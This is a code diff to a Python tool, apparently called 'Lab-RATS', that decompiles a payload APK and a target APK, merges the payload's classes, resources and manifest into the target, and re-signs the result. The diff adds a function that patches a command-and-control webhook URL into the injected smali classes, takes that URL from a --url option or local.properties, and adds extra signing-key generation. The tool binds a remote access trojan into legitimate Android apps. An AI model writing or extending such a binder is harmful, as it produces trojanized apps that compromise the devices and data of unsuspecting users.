@@ -191,6 +191,32 @@ def merge_smali_and_assets(payload_dir, target_dir):
     log_success("Payload Smali classes and assets successfully merged.")
 
 
+def patch_c2_url(target_dir, web_url):
+    if not web_url:
+        return
+    log_info(f"Patching C2 Webhook URL ({web_url}) into bound Smali classes...")
+    web_url_clean = web_url.strip().rstrip('/')
+
+    for root, _, files in os.walk(target_dir):
+        if "com/labs/labrats" in root.replace("\\", "/"):
+            for f in files:
+                if f.endswith(".smali"):
+                    sf = os.path.join(root, f)
+                    try:
+                        with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                            content = sfile.read()
+
+                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*', web_url_clean, content)
+                        new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url_clean + r'\2', new_content)
+
+                        if new_content != content:
+                            with open(sf, 'w', encoding='utf-8') as sfile:
+                                sfile.write(new_content)
+                    except Exception:
+                        pass
+    log_success("C2 Webhook URL successfully patched into Smali classes.")
+
+
 def merge_resources(payload_dir, target_dir):
     log_info("Merging payload resources (drawables, mipmaps, values) into target...")
     payload_res = os.path.join(payload_dir, "res")
@@ -482,13 +508,20 @@ def ensure_valid_keystore(keystore_path, storepass, keyalias):
 
     if not os.path.exists(keystore_path):
         log_info(f"Generating fresh keystore at {keystore_path}...")
-        cmd_gen = [
-            "keytool", "-genkeypair", "-alias", keyalias,
+        cmd_gen1 = [
+            "keytool", "-genkeypair", "-alias", "lab-rats-key",
             "-keyalg", "RSA", "-keysize", "2048", "-validity", "9125",
             "-keystore", keystore_path, "-storepass", storepass, "-keypass", storepass,
             "-dname", "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
         ]
-        run_cmd(cmd_gen)
+        run_cmd(cmd_gen1)
+        cmd_gen2 = [
+            "keytool", "-genkeypair", "-alias", "render",
+            "-keyalg", "RSA", "-keysize", "2048", "-validity", "9125",
+            "-keystore", keystore_path, "-storepass", storepass, "-keypass", storepass,
+            "-dname", "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
+        ]
+        run_cmd(cmd_gen2)
 
 
 def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, storepass, keyalias):
@@ -556,6 +589,7 @@ def main():
     parser.add_argument("--keystore", help="Path to JKS keystore")
     parser.add_argument("--storepass", default="lab-rats123", help="Keystore password")
     parser.add_argument("--keyalias", default="lab-rats-key", help="Key alias")
+    parser.add_argument("--url", help="C2 Webhook URL")
 
     args = parser.parse_args()
 
@@ -598,12 +632,22 @@ def main():
     payload_dir = os.path.join(work_dir, "payload")
     target_dir = os.path.join(work_dir, "target")
 
+    c2_url = args.url
+    if not c2_url:
+        local_props = os.path.join(project_dir, "local.properties")
+        if os.path.exists(local_props):
+            with open(local_props, "r", encoding="utf-8") as lp:
+                for l in lp:
+                    if l.startswith("WEBHOOK_URL="):
+                        c2_url = l.split("=", 1)[1].strip()
+
     try:
         target_apk = extract_bundle_if_needed(target_apk, work_dir)
         decompile_apk(apktool_cmd, payload_apk, payload_dir)
         decompile_apk(apktool_cmd, target_apk, target_dir)
 
         merge_smali_and_assets(payload_dir, target_dir)
+        patch_c2_url(target_dir, c2_url)
         merge_resources(payload_dir, target_dir)
         merge_manifests(payload_dir, target_dir)
         sanitize_manifest_and_resources(target_dir)
